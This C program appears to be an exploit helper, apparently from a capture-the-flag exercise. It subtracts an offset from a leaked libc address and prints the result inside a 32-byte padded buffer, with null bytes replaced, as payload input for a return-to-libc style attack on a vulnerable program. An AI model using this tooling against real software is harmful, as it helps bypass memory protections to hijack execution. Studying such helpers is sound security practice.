#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAXSIZE 32

int main (int argc, char ** argv){
	if(argc<3){
		printf("Wrong usage! Usage: ./hexto32byte ADDRESS_IN_LIBC OFFSET_OF_SYSTEM\n");
		return -1;
	}
	long int val=strtol(argv[1],NULL,0);
	long int offset=strtol(argv[2],NULL,0);
	val=val-offset;
	char buf[MAXSIZE+1];
	memset(buf,'a',MAXSIZE);
	buf[MAXSIZE]=0;
	memcpy(buf,&val,sizeof(int));
	int i;
	for(i=0;i<MAXSIZE;i++){
		if(buf[i]==0)
			buf[i]='r';
	}
	printf("%s",buf);
	return 0;
}
